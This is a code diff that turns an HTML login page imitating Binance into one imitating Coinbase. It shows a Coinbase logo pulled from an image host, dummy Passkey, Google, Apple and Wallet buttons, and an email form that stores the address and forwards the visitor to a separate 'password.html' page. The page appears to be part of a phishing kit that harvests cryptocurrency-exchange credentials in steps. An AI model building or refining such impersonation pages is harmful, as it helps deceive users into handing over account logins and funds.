@@ -2,199 +2,140 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Login</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<title>Sign In</title>
 
 <style>
-:root {
-  --bg:#0b0e11;
-  --card:#181a20;
-  --border:#2b3139;
-  --text:#eaecef;
-  --muted:#848e9c;
-  --yellow:#f0b90b;
-}
-
-*{
-  box-sizing:border-box;
-  font-family:'Inter',system-ui,sans-serif;
-}
-
+*{margin:0;padding:0;box-sizing:border-box}
 body{
-  margin:0;
-  background:var(--bg);
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:var(--text);
+background:#0a0b0d;
+font-family:Arial,sans-serif;
+color:white;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px
 }
-
-.container{
-  width:360px;
-  background:var(--card);
-  border-radius:12px;
-  padding:32px 28px;
+.login-container{
+width:100%;
+max-width:400px;
+padding:40px 20px
 }
-
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px
+}
 .logo{
-  text-align:center;
-  margin-bottom:28px;
+width:40px;
+height:auto;
 }
-
-.logo img{
-  width:140px;
-  display:block;
-  margin:0 auto;
+.signup-text{color:#578bfa;font-weight:500}
+.welcome-text{
+font-size:32px;
+font-weight:bold;
+margin-bottom:30px
 }
-
-h2{
-  font-size:20px;
-  margin:0 0 18px;
+.input-group{margin-bottom:20px}
+.input-label{
+color:#b0b3b8;
+margin-bottom:8px;
+display:block
 }
-
-input{
-  width:100%;
-  height:48px;
-  padding:0 14px;
-  margin-bottom:14px;
-  background:#0b0e11;
-  border:1px solid var(--border);
-  border-radius:8px;
-  color:var(--text);
-  font-size:14px;
+.input-field{
+width:100%;
+padding:12px 16px;
+background:#2a2d35;
+border:2px solid #3a3d45;
+border-radius:8px;
+color:white
 }
-
-input::placeholder{color:var(--muted)}
-
-button{
-  width:100%;
-  height:48px;
-  border-radius:8px;
-  font-weight:600;
-  cursor:pointer;
-  border:none;
-  font-size:14px;
+.next-button{
+width:100%;
+padding:12px;
+border:none;
+border-radius:25px;
+font-weight:bold;
+background:#304c84;
+cursor:pointer;
+margin-bottom:30px
 }
-
-.primary{
-  background:var(--yellow);
-  color:#000;
-}
-
-.secondary{
-  background:#0b0e11;
-  border:1px solid var(--border);
-  color:var(--text);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:10px;
-}
-
-.secondary img{
-  width:18px;
-  height:18px;
-}
-
-button+button{margin-top:12px}
-
+.next-button.valid{background:#578bfa}
 .divider{
-  display:flex;
-  align-items:center;
-  font-size:12px;
-  color:var(--muted);
-  margin:20px 0;
+display:flex;
+align-items:center;
+margin:30px 0;
+color:#6b7280
 }
-
-.divider::before,
-.divider::after{
-  content:"";
-  flex:1;
-  height:1px;
-  background:var(--border);
+.divider::before,.divider::after{
+content:'';
+flex:1;
+height:1px;
+background:#3a3d45
 }
-
-.divider span{margin:0 12px}
-
-.step{display:none}
-.step.active{display:block}
-
-.footer{
-  margin-top:22px;
-  text-align:center;
-  font-size:11px;
-  color:var(--muted);
+.divider::before{margin-right:16px}
+.divider::after{margin-left:16px}
+.social-buttons{display:flex;flex-direction:column;gap:12px}
+.social-button{
+width:100%;
+padding:12px;
+background:#32353d;
+border:none;
+border-radius:25px;
+color:white;
+font-weight:500;
+cursor:default
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="login-container">
 
-  <div class="logo">
-    <img src="https://i.ibb.co/QvRGdPMf/1681906234binance-logo-png.webp" alt="" aria-hidden="true">
-  </div>
+<div class="header">
+<img src="https://i.ibb.co/hxLZBrrz/Coinbase-Logo-PNG-File.png" class="logo" alt="Coinbase">
+<div class="signup-text">Sign Up</div>
+</div>
 
-  <!-- OPTIONS -->
-  <div class="step active" id="options">
-    <h2>Log In</h2>
+<h1 class="welcome-text">Sign In</h1>
 
-    <button class="primary" onclick="go('options','email')">
-      Continue with Email
-    </button>
+<form id="loginForm">
+<div class="input-group">
+<label class="input-label">Email</label>
+<input type="text" id="emailPhone" class="input-field" placeholder="Your email address" required>
+</div>
+<button type="submit" class="next-button">Continue</button>
+</form>
 
-    <div class="divider"><span>OR</span></div>
+<div class="divider">OR</div>
 
-    <!-- Dummy buttons -->
-    <button class="secondary">
-      🔐 Sign in with Passkey
-    </button>
-
-    <button class="secondary">
-      <img src="https://i.ibb.co/XxLFC0Nz/wheeling-dentist-crescent-family-dental-google-logo-google-logo-icon-11553533609z5yslh4apb.png" alt="">
-      Sign in with Google
-    </button>
-
-    <button class="secondary">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-      Sign in with Apple
-    </button>
-  </div>
-
-  <!-- EMAIL -->
-  <div class="step" id="email">
-    <h2>Email</h2>
-    <input type="email" placeholder="Email address">
-    <button class="primary" onclick="go('email','password')">Next</button>
-  </div>
-
-  <!-- PASSWORD -->
-  <div class="step" id="password">
-    <h2>Password</h2>
-    <input type="password" placeholder="Password">
-    <button class="primary" onclick="redirect()">Log In</button>
-  </div>
-
-  <div class="footer">
-  
-  </div>
+<div class="social-buttons">
+<button class="social-button">Sign in with Passkey</button>
+<button class="social-button">Sign in with Google</button>
+<button class="social-button">Sign in with Apple</button>
+<button class="social-button">Sign in with Wallet</button>
+</div>
 
 </div>
 
 <script>
-function go(from,to){
-  document.getElementById(from).classList.remove('active');
-  document.getElementById(to).classList.add('active');
-}
+const emailInput=document.getElementById("emailPhone");
+const btn=document.querySelector(".next-button");
 
-function redirect(){
-  // redirect to second file
-  window.location.href = "account-status.html";
-}
+emailInput.addEventListener("input",()=>{
+btn.classList.toggle("valid",emailInput.value.trim());
+});
+
+document.getElementById("loginForm").addEventListener("submit",function(e){
+e.preventDefault();
+const email=emailInput.value.trim();
+if(!email) return;
+sessionStorage.setItem("userEmail",email);
+window.location.href="password.html";
+});
 </script>
 
 </body>
